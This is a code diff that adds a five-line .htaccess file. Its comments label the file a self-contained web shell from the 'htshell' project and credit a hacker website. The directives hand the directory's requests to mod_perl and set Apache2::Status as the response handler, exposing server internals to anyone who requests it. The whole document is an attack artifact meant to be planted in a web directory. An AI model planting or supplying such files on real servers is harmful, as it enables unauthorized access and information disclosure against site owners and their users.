@@ -1,0 +1,5 @@
+# Self contained .htaccess web shell - Part of the htshell project
+# Written by Wireghoul - http://www.justanotherhacker.com
+SetHandler modperl
+PerlOptions +GlobalRequest
+PerlResponseHandler Apache2::Status
